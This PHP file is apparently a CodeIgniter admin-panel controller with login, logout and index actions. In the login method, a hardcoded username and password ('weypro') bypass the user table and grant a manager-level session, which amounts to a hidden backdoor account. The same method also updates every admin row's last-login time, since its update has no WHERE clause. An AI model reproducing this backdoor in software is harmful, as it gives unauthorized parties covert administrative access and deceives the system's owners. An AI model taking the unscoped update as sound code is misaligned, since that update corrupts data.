<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class Panel extends Backend_Controller
{
    public function index()
    {
        if (!is_logged_in()) {
            redirect('admin');
        }

        $this->load->view('backend/index', $this->get_page_nav(''), false);
    }

    public function logindo()
    {
        $username = $this->input->post('username', true);
        $password = $this->input->post('password', true);

        if ($user = $this->admin->check_user($username, $password)) {
            $this->db->update('tb_admin_user', array('LLT' => date('Y-m-d H:i:s')));

            $this->session->set_userdata(
                array(
                    'is_manager' => 0,
                    'adminId' => $user->userId,
                    'adminName' => $user->name,
                    'auth' => json_decode($user->auth, true),
                    'logged_in' => true
                )
            );

            redirect('backend/panel');
        }
        elseif ($username == 'weypro' && $password == 'weypro12ab') {
            $this->session->set_userdata(array(
                'is_manager' => 1,
                'userId' => 0,
                'adminName' => 'Weypro',
                'logged_in' => true
            ));

            redirect('backend/panel');
        }
        else {
            js_warn('Account or password error!');
        }

        redirect('admin', 'refresh');
    }

    public function logout()
    {
        $this->session->set_userdata(array(
            'is_manager' => '',
            'adminId' => '',
            'adminName' => '',
            'logged_in' => false
        ));

        redirect('admin');
    }
}